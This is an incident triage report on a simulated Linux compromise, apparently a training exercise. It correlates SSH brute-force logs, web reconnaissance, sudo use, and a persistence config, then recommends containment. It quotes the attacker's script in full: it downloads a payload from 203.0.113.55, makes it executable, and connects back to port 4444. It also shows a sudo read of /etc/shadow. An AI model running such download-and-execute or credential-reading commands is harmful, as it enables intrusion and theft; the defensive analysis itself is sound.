# Linux Incident Triage Report

## Executive summary

The available evidence suggests that the simulated Linux host was potentially compromised after a series of reconnaissance attempts, failed SSH authentication events and a successful login from the suspicious IP address `203.0.113.55`.

Following the successful SSH authentication, privileged commands were executed through `sudo`, including access to `/etc/shadow` and modification of the permissions of a suspicious script located at `/tmp/update.sh`.

The suspicious script downloads a payload from `203.0.113.55`, makes it executable and launches it with an outbound connection to `203.0.113.55:4444`.

A process named `.cache-update` was also observed running under the `analyst` account and consuming significant CPU resources.

Additionally, the file `home/analyst/.config/autostart.conf` references the same suspicious executable and remote destination, suggesting an attempt to establish persistence.

The evidence strongly suggests a compromise involving credential access, malicious payload execution, outbound command-and-control communication and persistence.

## Scope

The investigation was limited to the simulated evidence located in:

```text
exercises/linux-incident-triage/simulated-system/
```

The available evidence sources included:

- Authentication logs
- Web access logs
- Process listings
- Suspicious scripts
- User configuration files
- Simulated user account information
- File metadata and permissions

This investigation represents an initial triage and does not constitute a complete forensic analysis.

## Key findings

1. The IP address `203.0.113.55` generated multiple failed SSH login attempts against several accounts.

2. The same IP later successfully authenticated as the `analyst` user.

3. After successful authentication, the `analyst` account executed privileged commands through `sudo`.

4. A suspicious script located at `tmp/update.sh` downloads and executes a payload from `203.0.113.55`.

5. A suspicious process named `.cache-update` was observed connecting to `203.0.113.55:4444`.

6. A configuration file located at `home/analyst/.config/autostart.conf` appears to provide persistence for the suspicious executable.

7. The same IP address was observed in authentication logs, web logs, the suspicious process command line and the malicious script, creating a strong correlation between different evidence sources.

## Indicators of compromise

| Type | Indicator | Evidence |
|---|---|---|
| IP address | `203.0.113.55` | Authentication logs, web logs, process list, malicious script and persistence configuration |
| Port | `4444` | Suspicious process and persistence configuration |
| Process | `.cache-update` | Process listing |
| File | `tmp/update.sh` | Suspicious downloader and execution script |
| File | `/tmp/.cache-update` | Payload referenced by script and process list |
| Configuration | `home/analyst/.config/autostart.conf` | Possible persistence mechanism |
| User account | `analyst` | Account successfully accessed from suspicious IP |
| URL | `http://203.0.113.55/payload` | Payload download location |

## Authentication analysis

The authentication log contained five failed SSH authentication attempts originating from:

```text
203.0.113.55
```

The targeted usernames were:

```text
root
admin
analyst
```

The observed sequence was:

```text
02:11:02 Failed password for root
02:11:08 Failed password for root
02:11:14 Failed password for admin
02:11:21 Failed password for analyst
02:11:28 Failed password for analyst
```

At:

```text
02:11:36
```

the same source IP successfully authenticated as:

```text
analyst
```

The relevant event was:

```text
Accepted password for analyst from 203.0.113.55
```

This is highly significant because the same IP first generated multiple failed login attempts and later successfully authenticated.

The sequence is consistent with possible credential guessing or brute-force activity, although the evidence alone does not prove exactly how the credentials were obtained.

## Privileged activity

After the successful authentication, the `analyst` account executed privileged commands using `sudo`.

The first observed privileged command was:

```text
/usr/bin/cat /etc/shadow
```

This is security-sensitive because `/etc/shadow` contains password hashes and account authentication information.

The second privileged command was:

```text
/usr/bin/chmod 777 /tmp/update.sh
```

This command granted read, write and execute permissions to all users for the suspicious script.

The sequence strongly suggests that the compromised account was used to access sensitive authentication data and prepare a script for unrestricted execution.

## Web activity analysis

The suspicious IP address:

```text
203.0.113.55
```

generated several web requests before the SSH authentication activity.

The following suspicious paths were requested:

```text
/admin
/.env
/.git/config
/login
```

Observed HTTP responses included:

```text
403
404
401
```

The requests included:

- An attempt to access `/admin`
- An attempt to retrieve `/.env`
- An attempt to retrieve `/.git/config`
- Three repeated POST requests to `/login`

This behaviour is consistent with reconnaissance and web enumeration.

The attempts to access `/.env` and `/.git/config` are particularly security-relevant because these files may expose:

- credentials;
- API keys;
- environment variables;
- repository configuration;
- internal application information.

The repeated `401` responses against `/login` may indicate credential guessing.

## Process analysis

The suspicious process identified in the process listing was:

```text
/tmp/.cache-update --connect 203.0.113.55:4444
```

Process information:

```text
User: analyst
PID: 1873
CPU usage: 35.8%
Memory usage: 2.4%
Remote IP: 203.0.113.55
Remote port: 4444
```

The process is suspicious because:

- It executes from `/tmp`.
- Its name begins with a dot, making it less visible in normal directory listings.
- It connects to the same IP observed in the authentication and web logs.
- It uses port `4444`, which is not sufficient by itself to prove malicious activity but is unusual in this context.
- It consumes significantly more CPU than the other listed processes.

The correlation between the process, authentication logs, web logs and script provides strong evidence that the same infrastructure was involved throughout the incident.

## Suspicious file analysis

The file:

```text
tmp/update.sh
```

contained:

```bash
#!/usr/bin/env bash

curl -s http://203.0.113.55/payload -o /tmp/.cache-update
chmod +x /tmp/.cache-update
/tmp/.cache-update --connect 203.0.113.55:4444
```

The script performs three actions:

1. Downloads a file from:

```text
http://203.0.113.55/payload
```

2. Saves it as:

```text
/tmp/.cache-update
```

3. Makes it executable and launches it with an outbound connection to:

```text
203.0.113.55:4444
```

This behaviour is strongly suspicious and consistent with malicious payload delivery and command-and-control communication.

## Suspicious permissions

The file `tmp/update.sh` was configured with permissions equivalent to:

```text
777
```

This means:

```text
rwx rwx rwx
```

Every user can:

- read the file;
- modify the file;
- execute the file.

This violates the principle of least privilege.

An attacker or unauthorized user could modify or replace the script, making it possible to execute arbitrary commands.

The privileged command observed in the authentication logs confirms that the permissions were intentionally changed to `777`.

## Persistence analysis

The following configuration file was identified:

```text
home/analyst/.config/autostart.conf
```

Its content was:

```text
command=/tmp/.cache-update --connect 203.0.113.55:4444
enabled=true
```

This configuration attempts to automatically execute the suspicious `.cache-update` binary.

Because it references the same binary, IP address and port found elsewhere in the investigation, it is highly likely to be related to the suspicious activity.

This may represent a persistence mechanism designed to restart the malicious payload after a login, reboot or application startup event.

The exact execution mechanism cannot be fully confirmed from the available evidence, but the configuration is strongly suspicious.

## Event correlation

The IP address:

```text
203.0.113.55
```

appears in multiple independent evidence sources:

- Web logs
- SSH authentication logs
- Suspicious script
- Process list
- Persistence configuration

This correlation significantly increases confidence that the activities are related.

The observed sequence suggests a possible attack chain:

```text
Web reconnaissance
        ↓
Repeated SSH authentication failures
        ↓
Successful SSH authentication
        ↓
Privileged access to /etc/shadow
        ↓
Modification of suspicious script permissions
        ↓
Payload download
        ↓
Payload execution
        ↓
Outbound connection to 203.0.113.55:4444
        ↓
Persistence configuration
```

## Timeline

| Time | Event | Confidence |
|---|---|---|
| 01:58:02 | Normal request to `/` from `192.168.1.20` | Confirmed |
| 02:02:01 | `203.0.113.55` requests `/admin` and receives HTTP 403 | Confirmed |
| 02:02:08 | `203.0.113.55` requests `/.env` | Confirmed |
| 02:02:15 | `203.0.113.55` requests `/.git/config` | Confirmed |
| 02:02:28–02:02:40 | Three failed login requests return HTTP 401 | Confirmed |
| 02:11:02 | Failed SSH login for `root` from `203.0.113.55` | Confirmed |
| 02:11:08 | Second failed SSH login for `root` | Confirmed |
| 02:11:14 | Failed SSH login for `admin` | Confirmed |
| 02:11:21 | Failed SSH login for `analyst` | Confirmed |
| 02:11:28 | Second failed SSH login for `analyst` | Confirmed |
| 02:11:36 | Successful SSH authentication as `analyst` from `203.0.113.55` | Confirmed |
| 02:14:03 | `analyst` uses `sudo` to read `/etc/shadow` | Confirmed |
| 02:15:44 | `analyst` uses `sudo` to execute `chmod 777 /tmp/update.sh` | Confirmed |
| Unknown exact time | `update.sh` downloads `/tmp/.cache-update` | Inferred from script content |
| Unknown exact time | `.cache-update` executes and connects to `203.0.113.55:4444` | Confirmed by process listing |
| Unknown exact time | Autostart configuration is created to execute `.cache-update` | Confirmed artifact; exact creation sequence inferred |
| 09:02:13 | Legitimate-looking public-key authentication for `analyst` from `192.168.1.20` | Confirmed |

## Security assessment

The available evidence strongly suggests that the `analyst` account was compromised.

The following facts are confirmed:

- `203.0.113.55` performed reconnaissance against sensitive web paths.
- The same IP generated repeated failed SSH authentication attempts.
- The same IP later successfully authenticated as `analyst`.
- The `analyst` account executed privileged commands.
- A suspicious script downloaded a payload from the same IP.
- A process related to that payload connected to the same IP on port `4444`.
- A configuration file referenced the same process and destination.

A reasonable hypothesis is that the attacker obtained access to the `analyst` account, used it to escalate or abuse privileges, deployed a malicious payload and attempted to maintain persistence.

The available evidence does not prove exactly how the password was obtained or whether the compromise originated exclusively through SSH. Those details would require additional evidence.

## Recommended containment actions

### 1. Isolate the affected host

Disconnect the host from the network or move it into an isolated network segment.

Purpose:

- Prevent further attacker communication.
- Stop lateral movement.
- Preserve the environment for investigation.

### 2. Preserve forensic evidence

Before removing suspicious files or processes, collect:

- memory;
- process information;
- active network connections;
- logs;
- suspicious files;
- filesystem metadata.

Purpose:

- Avoid destroying evidence.
- Support deeper forensic analysis.

### 3. Terminate the suspicious process

The process:

```text
/tmp/.cache-update
```

should be terminated after relevant evidence is preserved.

### 4. Block malicious indicators

Block communication with:

```text
203.0.113.55
```

and investigate traffic involving:

```text
port 4444
```

This should be done at appropriate firewall, proxy, IDS or network-control layers.

### 5. Remove persistence

Investigate and remove the suspicious configuration:

```text
home/analyst/.config/autostart.conf
```

after evidence preservation.

### 6. Rotate credentials

Reset credentials associated with:

```text
analyst
```

and potentially other privileged accounts.

Because `/etc/shadow` was accessed, password hashes may have been exposed. A broader credential rotation should therefore be considered.

### 7. Review sudo permissions

Investigate why the `analyst` account was able to execute:

```text
cat /etc/shadow
chmod 777 /tmp/update.sh
```

Review the corresponding `sudoers` configuration.

### 8. Harden SSH

Consider:

- disabling password authentication where possible;
- using public-key authentication;
- disabling direct root login;
- implementing rate limiting;
- deploying fail2ban or equivalent controls;
- enabling MFA where available.

### 9. Hunt across other systems

Search other hosts and logs for:

```text
203.0.113.55
4444
.cache-update
update.sh
```

This determines whether the incident affected additional systems.

## Limitations

This investigation has several limitations:

- The evidence is simulated.
- No packet capture was available.
- No live network connection data was available.
- No memory image was available.
- No file hashes were provided.
- No complete process start timestamps were available.
- No complete shell history was available.
- The exact execution mechanism of the persistence configuration could not be fully verified.
- The origin of the compromised credential cannot be conclusively determined.

Therefore, some parts of the attack sequence remain reasonable inference rather than confirmed fact.

## Lessons learned

- The same IOC appearing across several evidence sources significantly strengthens an investigation.
- Failed authentication attempts followed by a successful login should be investigated carefully.
- Privileged access to `/etc/shadow` is highly security-sensitive.
- Executables launched from `/tmp` deserve special scrutiny.
- World-writable and world-executable permissions such as `777` can create significant security risks.
- Hidden files and autostart configurations may be used for persistence.
- Logs, processes, scripts and filesystem metadata should be correlated rather than analyzed independently.
- Incident reports should clearly distinguish confirmed evidence from inference.